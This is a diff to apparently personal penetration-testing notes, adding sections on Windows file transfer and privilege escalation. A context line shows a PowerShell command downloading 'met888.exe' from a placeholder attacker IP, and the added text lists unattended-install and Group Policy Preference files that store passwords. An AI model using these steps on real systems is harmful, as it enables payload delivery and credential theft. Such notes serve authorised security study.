@@ -14,3 +14,23 @@ Reverse Shell Cheat Sheet: https://highon.coffee/blog/reverse-shell-cheat-sheet/
 https://blog.ropnop.com/transferring-files-from-kali-to-windows/
 - When on Windows (no `curl` or `wget`) use PS `WebClient` object: `(new-object System.Net.WebClient).DownloadFile('http://IP_ADDR/met888.exe','C:\Users\AdminUser\
 Desktop\met888.exe')`
+
+## Transferring Files to Your Account - Tools -
+- `bitsadmin` - Windows command line tool to create download/upload jobs and monitor progress
+
+## Privileger Escalation
+### Windows Guides - Fundamentals
+http://www.fuzzysecurity.com/tutorials/16.html
+Location to check for config files w/stored passwords:
+Typically these are the directories that contain the configuration files (however it is a good idea to check the entire OS):
+- c:\sysprep.inf
+- c:\sysprep\sysprep.xml
+- %WINDIR%\Panther\Unattend\Unattended.xml
+- %WINDIR%\Panther\Unattended.xml
+
+In addition to Groups.xml (stored in SYSVOL) several other policy preference files can have the optional "cPassword" attribute set:
+Services\Services.xml: Element-Specific Attributes
+ScheduledTasks\ScheduledTasks.xml: Task Inner Element, TaskV2 Inner Element, ImmediateTaskV2 Inner Element
+Printers\Printers.xml: SharedPrinter Element
+Drives\Drives.xml: Element-Specific Attributes
+DataSources\DataSources.xml: Element-Specific Attributes
